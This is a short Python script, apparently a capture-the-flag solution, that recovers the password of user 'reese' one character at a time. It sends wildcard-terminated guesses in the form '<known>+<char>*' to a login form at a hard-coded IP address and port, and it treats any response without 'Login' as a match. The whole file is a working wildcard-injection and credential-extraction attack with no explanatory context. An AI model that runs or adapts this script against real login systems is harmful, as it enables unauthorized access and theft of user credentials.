import requests

url="http://209.97.177.45:31114/login"

dir=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","#","$","%","@","!","0","1","2","3","4","5","6","7","8","9","{","}","[","]","_","&","^"," "]

j=""

# data={"username":"*","password":"*"}
# res =requests.post(url=url,data=data)

for i in range(32):
    for i in dir:
        #print(i+"*")
        data={"username":"reese","password":j+i+"*"}
        res=requests.post(url=url,data=data)
        if "Login" in res.text:
            #print("wrong")
            continue
        else:
            #print(i)
            j+=i
            print("[+]password_is:"+j)

# if "Login" in res.text:
#   print(1)
# else:
#   print(12)

#print(res.text)
